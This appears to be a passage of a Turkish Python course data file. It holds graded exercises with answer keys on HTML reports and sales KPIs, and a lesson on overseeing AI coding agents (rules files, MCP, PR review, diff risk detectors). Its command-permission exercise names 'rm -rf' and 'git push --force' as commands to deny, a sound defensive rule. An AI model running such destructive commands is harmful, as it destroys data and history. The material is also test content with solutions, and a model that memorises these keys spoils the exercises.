        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Tek dosyalık HTML rapor iskeleti: <code>html_rapor(baslik, kartlar, gorseller)</code>. <code>kartlar</code> <code>[(ad, deger_metni)]</code>, <code>gorseller</code> <code>[(aciklama, png_bytes)]</code>. Çıktı tam olarak şu parçaların birleşimi olsun (araya boşluk yok):</p><ul><li><code>&lt;!doctype html&gt;&lt;html lang="tr"&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;{baslik}&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;{baslik}&lt;/h1&gt;</code></li><li>Her kart: <code>&lt;div class="kart"&gt;&lt;b&gt;{ad}&lt;/b&gt; {deger}&lt;/div&gt;</code></li><li>Her görsel: <code>&lt;img alt="{aciklama}" src="data:image/png;base64,{b64}"&gt;</code></li><li><code>&lt;/body&gt;&lt;/html&gt;</code></li></ul><p>Tüm metinler <code>html.escape</code> ile kaçırılsın (alt özniteliği dahil).</p>',
        start: 'import base64\nimport html\n\ndef html_rapor(baslik, kartlar, gorseller):\n    pass\n',
        sol: 'import base64\nimport html\n\ndef html_rapor(baslik, kartlar, gorseller):\n    b = html.escape(baslik)\n    parca = [f\'<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>{b}</title></head><body><h1>{b}</h1>\']\n    for ad, deger in kartlar:\n        parca.append(f\'<div class="kart"><b>{html.escape(ad)}</b> {html.escape(deger)}</div>\')\n    for aciklama, png in gorseller:\n        kod = base64.b64encode(png).decode()\n        parca.append(f\'<img alt="{html.escape(aciklama)}" src="data:image/png;base64,{kod}">\')\n    parca.append("</body></html>")\n    return "".join(parca)\n',
        tests: 'r = html_rapor("Satış & İade", [("Ciro", "54.312 TL")], [("Aylık \\"ciro\\"", b"PNG")])\nassert r == (\'<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>Satış &amp; İade</title></head>\'\n             \'<body><h1>Satış &amp; İade</h1><div class="kart"><b>Ciro</b> 54.312 TL</div>\'\n             \'<img alt="Aylık &quot;ciro&quot;" src="data:image/png;base64,UE5H"></body></html>\'), f"Gelen {r}"\nassert "<script>" not in html_rapor("<script>", [], [])\n',
        hints: ['base64.b64encode(bytes).decode() metin verir.', 'html.escape varsayılan olarak çift tırnağı da &quot; yapar; öznitelik için güvenli.'],
        why: 'Gömülü görselli tek HTML dosyası e-postayla gönderilebilir, paylaşılan klasörde açılabilir ve sunucu gerektirmez. Başlık ya da kart metni veriden geldiği için kaçış XSS\'e karşı şarttır.' },
      { t: 'code',
        id: 'seaborn-plotly-w5',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Hatayı bul ve düzelt. <code>sepet_karti(df)</code> panodaki "Ortalama sepet" kartını hesaplıyor ama değer, finans ekibinin hesapladığından çok düşük çıkıyor; ayrıca filtre tüm veriyi elediğinde pano <code>ZeroDivisionError</code> ile çöküyor. Ortalama sepet = toplam tutar / <b>sipariş</b> sayısı; veri yoksa <code>0.0</code>. Sonuç 2 basamak.</p>',
        start: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\ndef sepet_karti(df):\n    return round(df["Tutar"].sum() / len(df), 2)\n',
        sol: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\ndef sepet_karti(df):\n    n = df["SiparisNo"].nunique()\n    if n == 0:\n        return 0.0\n    return round(float(df["Tutar"].sum()) / n, 2)\n',
        tests: 'assert sepet_karti(s[s["YilAy"] == "2024-12"]) == 1620.71, "Aralık 2024 ortalama sepeti 1620.71 TL olmalı (sipariş başına)"\nassert sepet_karti(s.iloc[0:0]) == 0.0, "Boş veride 0.0"\n',
        hints: ['Bir siparişte birden çok satır olabilir.', 'len(df) satır sayısıdır; sipariş sayısı SiparisNo.nunique().'],
        why: 'Satış tablosunun tanecik düzeyi (grain) sipariş satırıdır, sipariş değil. KPI tanımı hangi düzeyde ise payda o düzeyde sayılmalıdır; pano filtreleri boş sonuç da üretebileceği için sıfıra bölme her kartta korunmalıdır.' },
      { t: 'code',
        id: 'seaborn-plotly-w6',
        stage: 'Meydan okuma',
        diff: 3,
        needs: ['pandas', 'matplotlib'],
        q: '<p>Uçtan uca aylık rapor: <code>aylik_rapor(df, ay)</code> tek dosyalık HTML metni döndürsün. Gereken: (1) <code>kpi</code> ile seçilen ayın ve bir önceki ayın KPI\'ları; (2) dört kart, sırayla <code>Ciro</code>, <code>Sipariş</code>, <code>Ortalama sepet</code>, <code>Marj</code>; değer metni <code>"{değer} ({değişim})"</code>: ciro ve sepet <code>f"{x:,.0f} TL"</code>, sipariş <code>str(n)</code>, marj <code>f"{x:.1%}"</code>; değişim yüzde değişim <code>f"{o:+.1%}"</code>, önceki 0 ise <code>"yeni"</code>; (3) son 12 ayın (seçilen ay dahil) aylık ciro çizgi grafiği matplotlib ile PNG olarak gömülsün, başlığı bir bulgu cümlesi: ciro önceki aya göre arttıysa <code>"{ay} cirosu önceki aydan yüksek"</code>, değilse <code>"{ay} cirosu önceki aydan düşük"</code> (alt metni de bu cümle); (4) <code>html_rapor</code>, <code>kpi</code> hazır. Önceki ay: <code>pd.Period(ay) - 1</code>.</p>',
        start: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\nimport base64, html, io\n\ndef kpi(df):\n    if df.empty:\n        return {"ciro": 0, "siparis": 0, "sepet": 0, "marj": 0}\n    ciro = float(df["Tutar"].sum()); n = int(df["SiparisNo"].nunique())\n    return {"ciro": round(ciro, 2), "siparis": n, "sepet": round(ciro / n, 2), "marj": round(1 - float(df["Maliyet"].sum()) / ciro, 3)}\n\ndef html_rapor(baslik, kartlar, gorseller):\n    b = html.escape(baslik)\n    p = [f\'<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>{b}</title></head><body><h1>{b}</h1>\']\n    p += [f\'<div class="kart"><b>{html.escape(a)}</b> {html.escape(d)}</div>\' for a, d in kartlar]\n    p += [f\'<img alt="{html.escape(a)}" src="data:image/png;base64,{base64.b64encode(g).decode()}">\' for a, g in gorseller]\n    return "".join(p + ["</body></html>"])\n\ndef aylik_rapor(df, ay):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ns = veri.oku("kesit_bi", "Satislar")\ns = s[s["Durum"] != "İptal"].copy()\ns["YilAy"] = s["Tarih"].str[:7]\nimport base64, html, io\nimport matplotlib\nmatplotlib.use("Agg")\nimport matplotlib.pyplot as plt\n\ndef kpi(df):\n    if df.empty:\n        return {"ciro": 0, "siparis": 0, "sepet": 0, "marj": 0}\n    ciro = float(df["Tutar"].sum()); n = int(df["SiparisNo"].nunique())\n    return {"ciro": round(ciro, 2), "siparis": n, "sepet": round(ciro / n, 2), "marj": round(1 - float(df["Maliyet"].sum()) / ciro, 3)}\n\ndef html_rapor(baslik, kartlar, gorseller):\n    b = html.escape(baslik)\n    p = [f\'<!doctype html><html lang="tr"><head><meta charset="utf-8"><title>{b}</title></head><body><h1>{b}</h1>\']\n    p += [f\'<div class="kart"><b>{html.escape(a)}</b> {html.escape(d)}</div>\' for a, d in kartlar]\n    p += [f\'<img alt="{html.escape(a)}" src="data:image/png;base64,{base64.b64encode(g).decode()}">\' for a, g in gorseller]\n    return "".join(p + ["</body></html>"])\n\ndef _degisim(bu, onceki):\n    return "yeni" if not onceki else f"{(bu - onceki) / onceki:+.1%}"\n\ndef aylik_rapor(df, ay):\n    onceki_ay = str(pd.Period(ay) - 1)\n    bu, on = kpi(df[df["YilAy"] == ay]), kpi(df[df["YilAy"] == onceki_ay])\n    bicim = {"ciro": lambda x: f"{x:,.0f} TL", "siparis": str,\n             "sepet": lambda x: f"{x:,.0f} TL", "marj": lambda x: f"{x:.1%}"}\n    adlar = {"ciro": "Ciro", "siparis": "Sipariş", "sepet": "Ortalama sepet", "marj": "Marj"}\n    kartlar = [(adlar[k], f"{bicim[k](bu[k])} ({_degisim(bu[k], on[k])})") for k in adlar]\n    bas = str(pd.Period(ay) - 11)\n    aylik = df[(df["YilAy"] >= bas) & (df["YilAy"] <= ay)].groupby("YilAy")["Tutar"].sum()\n    yon = "yüksek" if bu["ciro"] > on["ciro"] else "düşük"\n    cumle = f"{ay} cirosu önceki aydan {yon}"\n    fig, ax = plt.subplots(figsize=(6, 2.5))\n    ax.plot(aylik.index, aylik.values)\n    ax.set_title(cumle)\n    tampon = io.BytesIO()\n    fig.savefig(tampon, format="png", dpi=80)\n    plt.close(fig)\n    return html_rapor(f"Satış raporu — {ay}", kartlar, [(cumle, tampon.getvalue())])\n',
        tests: 'import re\nr = aylik_rapor(s, "2024-12")\nkartlar = re.findall(r\'<div class="kart"><b>(.*?)</b> (.*?)</div>\', r)\nassert [k[0] for k in kartlar] == ["Ciro", "Sipariş", "Ortalama sepet", "Marj"], f"Kart sırası: {kartlar}"\nassert kartlar[1][1] == "58 (+0.0%)", f"Sipariş kartı: {kartlar[1]}"\nassert kartlar[0][1] == "94,001 TL (+5.6%)", f"Ciro kartı: {kartlar[0]}"\nassert \'alt="2024-12 cirosu önceki aydan yüksek"\' in r, "Bulgu cümlesi alt metinde olmalı"\npng = re.search(r"base64,([A-Za-z0-9+/=]+)", r).group(1)\nimport base64\nassert base64.b64decode(png)[:4] == b"\\x89PNG", "Gömülü görsel PNG olmalı"\nassert "(yeni)" in aylik_rapor(s, "2022-06"), "İlk satış ayında önceki ay yok: yeni"\n',
        hints: ['pd.Period("2024-12") - 1 → 2024-11; str() ile metne çevir.', 'Kartları bir ad sözlüğü ve biçim sözlüğüyle döngüde üret.', 'Görseli io.BytesIO\'ya savefig ile yaz, getvalue() ile bytes al; plt.close unutma.'],
        why: 'Bu, zamanlanmış bir betiğin her ay e-postayla göndereceği raporun çekirdeğidir: KPI + karşılaştırma + bulgu cümlesi başlıklı grafik. Hesaplama, biçimlendirme ve sunum ayrı fonksiyonlarda olduğu için her biri ayrı test edilebilir.' }
    ],
    faq: [
      { q: 'Streamlit panomu başkalarıyla nasıl paylaşırım?',
        a: 'Kod GitHub\'daysa Streamlit Community Cloud\'a ücretsiz yayınlayabilirsin; kurum içi veride ise uygulamayı bir sunucuda ya da Docker konteynerinde çalıştırıp kurum ağına açarsın. Kişisel ya da gizli veriyi herkese açık bir uygulamaya koyma; Streamlit\'in kimlik doğrulama seçeneklerini ya da kurumun ters vekil sunucusunu kullan.' },
      { q: 'Pano mu, rapor mu hazırlamalıyım?',
        a: 'Aynı soruya düzenli olarak bakılıyorsa (günlük satış, stok) pano; bir karar için tek seferlik bir mesaj iletilecekse (kampanya sonucu, yıllık değerlendirme) hikâyeli rapor. Çoğu ekipte ikisi birlikte yaşar: pano izlemeyi, rapor yorumlamayı sağlar.' }
    ],
    mistakes: [
      { bad: 'sepet = df["Tutar"].sum() / len(df)',
        good: 'sepet = df["Tutar"].sum() / df["SiparisNo"].nunique()',
        why: 'Satış tablosu sipariş satırı düzeyindedir; sipariş başına KPI için benzersiz sipariş sayısına böl.' }
    ] }
);
})(window);
/* Kesit Python — 'yapay-zeka-ile-kod' dersi uzantısı: ajanlı kodlama iş akışı, kurallar dosyası, MCP, ajan PR inceleme kontrol listesi (AUDIT Ekle-10) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'yapay-zeka-ile-kod',
    min: 25,
    html: `<h2>Derinleş: ajanlı kodlama iş akışı</h2><p>Sohbet asistanı sana kod parçası verir; <b>kodlama ajanı</b> (coding agent) ise depoyu okur, dosyaları düzenler, testleri ve komutları çalıştırır, çıktıya bakıp kendini düzeltir. Claude Code (terminal ve IDE), Cursor'ın ajan modu ve GitHub'daki ajanlar bu sınıftadır. Güç arttıkça senin rolün "kodu yazan"dan <b>görevi tanımlayan, sınırları çizen ve sonucu inceleyen</b> kişiye kayar. Bu bölüm o rolü anlatıyor.</p><h3>Döngü: keşfet → planla → uygula → doğrula</h3><div class="steps-list"><ol><li><b>Keşfet:</b> Ajandan önce kodu okumasını iste ("ilgili dosyaları bul, henüz değiştirme"). Yanlış varsayımlar en ucuz bu aşamada yakalanır.</li><li><b>Planla:</b> Değişikliği adımlara bölmesini ve planı sana göstermesini iste. Planı onayla ya da düzelt.</li><li><b>Uygula:</b> Küçük adımlarla; her adım ayrı commit. Büyük tek seferlik değişiklik incelenemez.</li><li><b>Doğrula:</b> Testler, linter, tip denetimi ajanın kendi çalıştırabileceği komutlar olmalı. "Bitti" demesi değil, testlerin yeşil olması ölçüttür.</li></ol></div><p>İyi görev tanımı bir iş biletine benzer: amaç, kapsam (hangi dosyalar/modüller), kapsam dışı, kabul ölçütleri (hangi testler geçmeli), kısıtlar (yeni bağımlılık yok, genel API değişmez). Büyük işi bağımsız alt görevlere böl: "CSV içe aktarmayı yeniden yaz" yerine önce "mevcut davranışı belgeleyen testleri yaz", sonra "ayrıştırıcıyı ayır", sonra "hata raporlamayı ekle".</p><pre class="py">gorevler = {
    "testleri_yaz": [],
    "ayristiriciyi_ayir": ["testleri_yaz"],
    "hata_raporu": ["ayristiriciyi_ayir"],
    "belgeleri_guncelle": ["ayristiriciyi_ayir"],
}
from graphlib import TopologicalSorter
print(list(TopologicalSorter(gorevler).static_order()))</pre><h3>Kurallar dosyası: projenin hafızası</h3><p>Ajan her oturuma sıfır bağlamla başlar. Projenin kökündeki kurallar dosyası (Claude Code için <code>CLAUDE.md</code>, Cursor için <code>.cursor/rules</code>, birçok araç için <code>AGENTS.md</code>) her oturumda otomatik okunur. İçine yalnız <b>kalıcı ve doğrulanabilir</b> bilgi koy: nasıl kurulur, nasıl test edilir, kod stili, dokunulmayacak yerler. Uzun ve belirsiz dosya ("temiz kod yaz") işe yaramaz; kısa ve komut odaklı olsun.</p><pre class="code"># CLAUDE.md — Anadolu Market sipariş servisi

## Komutlar
- Kurulum: uv sync
- Test: uv run pytest -q   (her değişiklikten sonra çalıştır)
- Lint/biçim: uv run ruff check . &amp;&amp; uv run ruff format --check .

## Kurallar
- Python 3.12, tip ipuçları zorunlu; para tutarları Decimal.
- Yeni bağımlılık eklemeden önce sor.
- migrations/ ve config/prod.yaml dosyalarını DEĞİŞTİRME.
- Veritabanı sorgularında f-string YOK; parametre kullan.

## Mimari
- api/ (FastAPI uç noktaları) → servis/ (iş kuralları) → depo/ (SQL). Katman atlama yok.</pre><h3>MCP ile araç bağlamak</h3><p><b>Model Context Protocol</b> (MCP), ajanın dış araçlara (veritabanı, hata takip sistemi, belge deposu, tarayıcı) standart bir arayüzle bağlanmasını sağlar. Bir MCP sunucusu araçlarını adı, açıklaması ve JSON şemalı girdileriyle ilan eder; ajan gerektiğinde çağırır. LLM API dersindeki araç çağırma döngüsünün standartlaşmış hâlidir. Güvenlik kuralı: ajana yalnız gereken araçları ve en az yetkiyi ver (salt okunur veritabanı kullanıcısı, test ortamı anahtarı). Araçtan gelen metin de güvenilmeyen girdidir; istem enjeksiyonu taşıyabilir.</p><pre class="code">// .mcp.json (proje kökü) — örnek yapı
{
  "mcpServers": {
    "market-db": {
      "command": "uvx",
      "args": ["mcp-server-sqlite", "--db-path", "./yerel_kopya.db"]
    }
  }
}</pre><h3>Ajan çıktısını PR olarak incelemek</h3><p>Ajanın değişikliği bir dal (branch) ve çekme isteği (pull request) olarak gelmeli; ana dala doğrudan yazmamalı. İncelerken bir insanın kodunu incelerken baktığın her şeye ek olarak ajanlara özgü risklere bak:</p><div class="tbl-wrap"><table><tr><th>Kontrol</th><th>Neden?</th></tr><tr><td>Diff kapsamı görevle uyumlu mu? İlgisiz dosya değişmiş mi?</td><td>Ajanlar "bu arada" düzeltmeler yapar; incelenmemiş değişiklik riski.</td></tr><tr><td>Testler silinmiş, atlanmış (<code>skip</code>) ya da beklenen değer kodu tutacak şekilde değiştirilmiş mi?</td><td>Testi geçirmenin en kolay yolu testi bozmaktır.</td></tr><tr><td>Yeni bağımlılık var mı? Paket gerçekten var mı, adı doğru mu?</td><td>Uydurma ya da adı benzeyen kötü niyetli paketler (typosquatting).</td></tr><tr><td>Sır, anahtar, kişisel veri eklenmiş mi?</td><td>Ajan log ya da örnek veriyi koda gömebilir.</td></tr><tr><td>Hata yutma: çıplak <code>except</code>, <code>pass</code>, sessiz <code>None</code></td><td>Çalışıyor gibi görünür, hatayı gizler.</td></tr><tr><td>CI yeşil mi ve sen de yerelde çalıştırdın mı?</td><td>"Testler geçti" cümlesi kanıt değildir.</td></tr></table></div><div class="warn"><b>İzinler</b>Ajana komut çalıştırma izni verirken izin listesini dar tut (test, lint, git diff). <code>rm -rf</code>, üretim veritabanı, <code>git push --force</code>, dağıtım komutları insan onayı istemeli. Mümkünse ajanı konteyner ya da ayrı bir çalışma ağacında (git worktree) çalıştır.</div><div class="note"><b>Gerçek işte</b>Ekipler ajanları en çok iyi tanımlı işlerde verimli buluyor: test yazma, bağımlılık güncelleme, tip ipucu ekleme, küçük hata düzeltmeleri, belge. Mimari kararlar ve belirsiz gereksinimler hâlâ insanın işi. Mülakatlarda "yapay zekâ araçlarını nasıl kullanıyorsun?" sorusuna iyi cevap, aracın adını değil doğrulama alışkanlığını anlatır: kurallar dosyası, küçük PR, test kanıtı, inceleme listesi.</div>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Kodlama ajanından büyük bir yeniden düzenleme (refactor) isteyeceksin. İlk adım olarak en verimli istek hangisi?',
        o: ['"Tüm modülü baştan, en iyi uygulamalarla yeniden yaz ve bitince bana haber ver."', '"İlgili dosyaları oku, mevcut davranışı özetle ve adım adım plan öner; henüz kod değiştirme."', '"Testleri sonra yazarız; önce kodun tamamını tek seferde güncelle ki zaman kazanalım."', '"Ne yapacağına sen karar ver; değişiklikleri doğrudan ana dala gönderebilirsin."'],
        a: 1,
        why: 'Keşif ve plan aşaması yanlış varsayımları kod yazılmadan yakalar. Tek seferlik büyük değişiklik incelenemez; ana dala doğrudan yazma ise inceleme adımını ortadan kaldırır.' },
      { t: 'mc',
        stage: 'Isınma',
        q: 'Proje kurallar dosyasına (CLAUDE.md / AGENTS.md) hangisini yazmak EN AZ faydalıdır?',
        o: ['Testleri çalıştırma komutu: uv run pytest -q', '"migrations/ klasörünü değiştirme" gibi dokunulmayacak yerler', '"Her zaman temiz, okunabilir ve kaliteli kod yaz."', 'Para tutarları için Decimal kullanılması kuralı'],
        a: 2,
        why: 'Kurallar dosyası somut ve doğrulanabilir bilgi içermeli. "Temiz kod yaz" ajanın zaten varsayılan hedefidir; davranışı değiştirmez, yalnız bağlamı doldurur.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Ajan PR\'ındaki değişen dosyaları kapsam listesiyle karşılaştıran kod. Ne yazdırır?',
        code: 'from fnmatch import fnmatch\nizinli = ["servis/*.py", "tests/test_*.py"]\ndegisen = ["servis/sepet.py", "tests/test_sepet.py", "config/prod.yaml", "servis/alt/vergi.py"]\ndisari = [f for f in degisen if not any(fnmatch(f, d) for d in izinli)]\nprint(disari)\n',
        o: ['[\'config/prod.yaml\']', '[\'config/prod.yaml\', \'servis/alt/vergi.py\']', '[]', '[\'servis/alt/vergi.py\']'],
        a: 0,
        why: 'fnmatch\'te * eğik çizgi dahil her karakterle eşleşir; bu yüzden "servis/*.py" alt klasördeki vergi.py\'yi de kapsar. Kapsam dışı tek dosya config/prod.yaml\'dır. Klasör sınırı istiyorsan pathlib.PurePath.match ya da ayrı kontrol gerekir.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w1',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Ajan PR\'ının diff metninden değişen dosyaları çıkar: <code>degisen_dosyalar(diff)</code> <code>diff --git a/X b/X</code> satırlarındaki <code>b/</code> yolunu sırayla (tekrarsız) liste olarak döndürsün. Sonra <code>kapsam_disi(diff, izinli_onekler)</code> yaz: yolu verilen öneklerin hiçbiriyle başlamayan dosyaları döndürsün.</p>',
        guide: ['Diff\'i satırlara böl.', '"diff --git " ile başlayan satırlarda son parçayı al ve "b/" önekini at.', 'Tekrarı önlemek için görülen yolları takip et.', 'kapsam_disi için str.startswith\'e önek demeti ver.'],
        example: 'satir = "diff --git a/x.py b/x.py"\nprint(satir.split()[-1][2:])\n',
        start: 'def degisen_dosyalar(diff):\n    # TODO\n    return []\n\ndef kapsam_disi(diff, izinli_onekler):\n    # TODO\n    return []\n',
        sol: 'def degisen_dosyalar(diff):\n    yollar = []\n    for satir in diff.splitlines():\n        if satir.startswith("diff --git "):\n            yol = satir.split()[-1]\n            if yol.startswith("b/"):\n                yol = yol[2:]\n            if yol not in yollar:\n                yollar.append(yol)\n    return yollar\n\ndef kapsam_disi(diff, izinli_onekler):\n    return [y for y in degisen_dosyalar(diff) if not y.startswith(tuple(izinli_onekler))]\n',
        tests: 'DIFF = \'diff --git a/servis/sepet.py b/servis/sepet.py\\n@@ -10,3 +10,4 @@\\n+import requests\\n def toplam(kalemler):\\n-    return sum(k.fiyat * k.adet for k in kalemler)\\n+    return round(sum(k.fiyat * k.adet for k in kalemler), 2)\\ndiff --git a/tests/test_sepet.py b/tests/test_sepet.py\\n@@ -5,4 +5,4 @@\\n-def test_toplam():\\n+@pytest.mark.skip\\n+def test_toplam():\\ndiff --git a/config/prod.yaml b/config/prod.yaml\\n@@ -1,1 +1,1 @@\\n-debug: false\\n+debug: true\\n\'\nassert degisen_dosyalar(DIFF) == ["servis/sepet.py", "tests/test_sepet.py", "config/prod.yaml"], f"Gelen {degisen_dosyalar(DIFF)}"\nassert kapsam_disi(DIFF, ["servis/", "tests/"]) == ["config/prod.yaml"], "prod ayarı kapsam dışı"\nassert kapsam_disi(DIFF, ["servis/", "tests/", "config/"]) == []\nassert degisen_dosyalar("") == []\n',
        hints: ['satir.split()[-1] "b/servis/sepet.py" verir.', 'startswith bir demet alabilir: y.startswith(("a/", "b/")).'],
        why: 'İncelemenin ilk sorusu "değişiklik görevle sınırlı mı?" sorusudur. Bunu otomatikleştirmek, ajanın ilgisiz dosyalara dokunduğunu insan diff\'i okumadan önce yakalar.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w2',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>PR inceleme kontrol listesinin otomatik kısmı: <code>riskler(diff)</code> yalnız <b>eklenen</b> satırlara (<code>+</code> ile başlayan, <code>+++</code> hariç) bakarak şu risk etiketlerini, ilk görüldükleri sırayla ve tekrarsız liste olarak döndürsün:</p><ul><li><code>"test-atlama"</code>: satırda <code>pytest.mark.skip</code> ya da <code>@unittest.skip</code></li><li><code>"yeni-bagimlilik"</code>: satır (önek <code>+</code> atıldıktan sonra) <code>import </code> ya da <code>from </code> ile başlıyor</li><li><code>"debug-acik"</code>: satırda <code>debug: true</code> ya da <code>DEBUG = True</code></li><li><code>"sessiz-hata"</code>: satır (boşluklar atılmış) tam olarak <code>except:</code> ya da <code>except Exception: pass</code></li></ul>',
        guide: ['Satırları gez; + ile başlayıp +++ ile başlamayanları al.', 'Öneki at: satir[1:]; baştaki boşlukları strip ile temizle.', 'Her kural için koşulu denetle; etiketi listede yoksa ekle.'],
        example: 'for s in ["+a", "+++ b", "-c"]:\n    if s.startswith("+") and not s.startswith("+++"):\n        print(s[1:])\n',
        start: 'def riskler(diff):\n    bulunan = []\n    # TODO: eklenen satırları gez, kuralları uygula\n    return bulunan\n',
        sol: 'def riskler(diff):\n    bulunan = []\n    def ekle(etiket):\n        if etiket not in bulunan:\n            bulunan.append(etiket)\n    for satir in diff.splitlines():\n        if not satir.startswith("+") or satir.startswith("+++"):\n            continue\n        govde = satir[1:].strip()\n        if "pytest.mark.skip" in govde or "@unittest.skip" in govde:\n            ekle("test-atlama")\n        if govde.startswith(("import ", "from ")):\n            ekle("yeni-bagimlilik")\n        if "debug: true" in govde or "DEBUG = True" in govde:\n            ekle("debug-acik")\n        if govde in ("except:", "except Exception: pass"):\n            ekle("sessiz-hata")\n    return bulunan\n',
        tests: 'DIFF = \'diff --git a/servis/sepet.py b/servis/sepet.py\\n@@ -10,3 +10,4 @@\\n+import requests\\n def toplam(kalemler):\\n-    return sum(k.fiyat * k.adet for k in kalemler)\\n+    return round(sum(k.fiyat * k.adet for k in kalemler), 2)\\ndiff --git a/tests/test_sepet.py b/tests/test_sepet.py\\n@@ -5,4 +5,4 @@\\n-def test_toplam():\\n+@pytest.mark.skip\\n+def test_toplam():\\ndiff --git a/config/prod.yaml b/config/prod.yaml\\n@@ -1,1 +1,1 @@\\n-debug: false\\n+debug: true\\n\'\nassert riskler(DIFF) == ["yeni-bagimlilik", "test-atlama", "debug-acik"], f"Gelen {riskler(DIFF)}"\nassert riskler("-import os\\n+x = 1") == [], "Silinen satırlar risk sayılmaz"\nassert riskler("+    try:\\n+        f()\\n+    except:\\n+        pass") == ["sessiz-hata"]\nassert riskler("+++ b/a.py\\n+from x import y\\n+import z") == ["yeni-bagimlilik"], "+++ başlığı atlanmalı, etiket tekrarlanmamalı"\n',
        hints: ['startswith demet alabilir: govde.startswith(("import ", "from ")).', 'Tekrarı önlemek için küçük bir ekle() yardımcı fonksiyonu yaz.'],
        why: 'Bu tür kurallar incelemeyi değil incelemecinin dikkatini yönlendirir: bir test atlandıysa ya da yeni import geldiyse insan mutlaka bakmalıdır. Gerçek ekipler benzer denetimleri CI\'da danger, pre-commit ya da özel betiklerle yapar.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w3',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Kurallar dosyası denetleyicisi: <code>kural_denetle(metin)</code> bir CLAUDE.md metnini alıp eksikleri liste olarak döndürsün (sırayla):</p><ul><li><code>"komutlar bölümü yok"</code>: <code>## Komutlar</code> başlığı yoksa</li><li><code>"test komutu yok"</code>: metinde <code>pytest</code> geçmiyorsa</li><li><code>"çok uzun"</code>: 200 satırdan fazlaysa</li><li><code>"belirsiz kural: ..."</code>: <code>- </code> ile başlayan her madde satırı için, satır (küçük harfe çevrilmiş) <code>"temiz kod"</code>, <code>"en iyi"</code> ya da <code>"kaliteli"</code> içeriyorsa; <code>...</code> yerine maddenin kendisi (<code>- </code> öneki atılmış)</li></ul>',
        start: 'def kural_denetle(metin):\n    pass\n',
        sol: 'BELIRSIZ = ("temiz kod", "en iyi", "kaliteli")\n\ndef kural_denetle(metin):\n    eksik = []\n    satirlar = metin.splitlines()\n    if not any(s.strip() == "## Komutlar" for s in satirlar):\n        eksik.append("komutlar bölümü yok")\n    if "pytest" not in metin:\n        eksik.append("test komutu yok")\n    if len(satirlar) > 200:\n        eksik.append("çok uzun")\n    for s in satirlar:\n        if s.startswith("- ") and any(b in s.lower() for b in BELIRSIZ):\n            eksik.append("belirsiz kural: " + s[2:])\n    return eksik\n',
        tests: 'iyi = "# Proje\\n## Komutlar\\n- Test: uv run pytest -q\\n## Kurallar\\n- Para için Decimal kullan."\nassert kural_denetle(iyi) == []\nkotu = "# Proje\\n- Her zaman Temiz kod yaz.\\n- En iyi uygulamalara uy.\\n- Decimal kullan."\nassert kural_denetle(kotu) == ["komutlar bölümü yok", "test komutu yok", "belirsiz kural: Her zaman Temiz kod yaz.", "belirsiz kural: En iyi uygulamalara uy."], f"Gelen {kural_denetle(kotu)}"\nassert "çok uzun" in kural_denetle(iyi + "\\n" * 250)\n',
        hints: ['Satır sayısı için splitlines kullan.', 'Belirsizlik kontrolünü küçük harfe çevrilmiş satırda yap ama mesaja orijinal maddeyi yaz.'],
        why: 'Kurallar dosyası her oturumda bağlama girer; uzun ve belirsiz satırlar maliyet ve dikkat dağınıklığıdır. Komut ve yasak listesi gibi somut bilgiler ajanın davranışını gerçekten değiştirir.' },
      { t: 'code',
        id: 'yapay-zeka-ile-kod-w4',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Ajanın komut izinleri: <code>komut_karari(komut, izinli, onayli)</code> <code>"izin"</code>, <code>"onay"</code> ya da <code>"red"</code> döndürsün. Komutu <code>shlex.split</code> ile böl. Kurallar sırayla:</p><ol><li>Komut <code>;</code>, <code>&amp;&amp;</code>, <code>|</code> ya da <code>`</code> karakterlerinden birini içeriyorsa (zincirleme) <code>"onay"</code>.</li><li>Parçalar <code>["rm", "-rf", ...]</code> ile başlıyorsa ya da <code>git push</code> ve <code>--force</code> içeriyorsa <code>"red"</code>.</li><li>Komutun ilk iki parçası (tek parçalıysa ilki) boşlukla birleştirildiğinde <code>izinli</code> kümesindeyse <code>"izin"</code>; ilk parça izinlide ise de <code>"izin"</code>.</li><li>Aynı denetim <code>onayli</code> için <code>"onay"</code>.</li><li>Aksi hâlde <code>"red"</code>.</li></ol><p><code>shlex</code> ayrıştıramazsa (<code>ValueError</code>) <code>"red"</code>.</p>',
        start: 'import shlex\n\ndef komut_karari(komut, izinli, onayli):\n    pass\n',
        sol: 'import shlex\n\ndef komut_karari(komut, izinli, onayli):\n    if any(z in komut for z in (";", "&&", "|", "`")):\n        return "onay"\n    try:\n        p = shlex.split(komut)\n    except ValueError:\n        return "red"\n    if not p:\n        return "red"\n    if p[:2] == ["rm", "-rf"] or (p[:2] == ["git", "push"] and "--force" in p):\n        return "red"\n    anahtarlar = {" ".join(p[:2]), p[0]}\n    if anahtarlar & set(izinli):\n        return "izin"\n    if anahtarlar & set(onayli):\n        return "onay"\n    return "red"\n',
